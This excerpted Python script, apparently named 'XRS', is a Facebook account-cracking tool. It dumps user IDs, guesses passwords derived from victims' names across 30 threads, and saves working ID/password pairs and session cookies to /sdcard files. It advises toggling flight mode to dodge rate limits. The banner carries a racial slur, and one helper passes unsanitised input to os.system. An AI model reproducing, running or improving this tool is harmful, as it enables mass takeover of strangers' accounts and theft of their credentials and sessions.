...
os.system('clear')
print('Installing Modules from XRS server ...\n')
...
from concurrent.futures import ThreadPoolExecutor as gobriaxrs
from string import * 
...
sys.stdout.write('\x1b]2; XRS\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
logo =                                          """            
\033[1;37m    
\033[1;37m   db    db d8888b. .d8888. 
\033[1;37m   `8b  d8' 88  `8D 88'  YP 
\033[1;37m    `8bd8'  88oobY' `8bo.   
\033[1;37m    .dPYb.  88`8b     `Y8b. 
\033[1;37m   .8P  Y8. 88 `88. db   8D 
\033[1;37m   YP    YP 88   YD `8888Y' 
\033[1;37m     Use Your Brain Niggas!                         
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            XRS-D-Gobria
\033[1;37m Github  :            xrs-cybar
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back XRS Menu ")
        exit()
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        self.file = input('File Name Please : ')
        try:
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[XRS] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [XRS-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/XRS_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/XRS_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [XRS-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/XRS_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[XRS] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [XRS-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/XRS_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/XRS_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [XRS-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[XRS] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[XRS] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [XRS-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/XRS_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(f"\r{A}Use Flight Mode in Every 2 Minutes {S}")
            print(47*"-")
            print(f'{S} Total IDs : %s ' % len(self.id))
            print(f'{S} Cracking Started...')
            print(47*"-")
            with gobriaxrs(max_workers=30) as xrsworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                xrsworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                xrsworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                xrsworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                xrsworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Public ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/XRS.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/XRS.txt\033[0;97m')
    print(47*'-')
    new_save = input('Save new file as: ')
    clear()
    print('\033[1;37mExample: 10001,10002,10003')
    print(47*'-')
    y = 0
...
def cutter():
    ...
    xrs = input('Put File Name :')
    print(" ")
    gobria = input('Saving Put File Name :')
    os.system('touch ' +gobria)
    os.system('sort -r '+xrs+' | uniq > '+gobria)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + xrs )
    print(47*'-')
    print("File Saved To :" + gobria )
    print(47*'-')
    input(f"{S} Press Enter To Back XRS Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/XRS.txt\n') 
        filepath = input("Put File Name: ")
